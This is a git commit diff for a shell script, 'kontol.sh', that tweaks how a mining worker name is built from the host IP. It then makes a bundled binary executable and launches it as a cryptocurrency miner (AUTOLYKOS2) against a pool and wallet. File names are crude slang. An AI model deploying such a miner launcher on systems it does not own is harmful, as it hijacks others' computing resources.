bea0daadc987e83b981cceb3ed745522be273a0b
renilo <88342640+renilo@users.noreply.github.com>
2021-09-24 16:34:40 +0700

    Update kontol.sh

--- kontol.sh
+++ kontol.sh
@@ -5,6 +5,6 @@ r1=${myip/./_}
 r2=${r1/./_}
 r3=${r2/./_}
 r4=${r3/./_}
-WORKER=$(echo $r4.P100)
+WORKER=$(echo $r4-P100)
 chmod +x memek
 ./memek --algo AUTOLYKOS2 --pool $POOL --user $WALLET.$WORKER
